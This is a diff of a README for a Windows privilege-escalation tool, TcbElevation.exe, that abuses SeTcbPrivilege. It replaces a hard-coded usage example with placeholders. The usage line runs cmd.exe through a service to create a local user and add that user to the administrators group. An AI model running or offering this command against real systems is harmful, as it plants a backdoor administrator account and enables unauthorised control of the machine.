@@ -6,11 +6,15 @@ Due to its powerful nature, SeTcbPrivilege is typically reserved for critical sy
 
 # Usage
 
+## Simple example:
 ```powershell
-.\TcbElevation.exe xtk "C:\Windows\System32\cmd.exe /c net user xtk Passw0rd123 /add && net localgroup administrators xtk /add"
+.\TcbElevation.exe <name of the service> "C:\Windows\System32\cmd.exe /c net user <user> <password> /add && net localgroup administrators <user> /add"
 
 Error starting service 1053
 ```
+Please note: "Error starting service 1053" is expected
+
+
 # Sources
 The code comes from:
 https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178
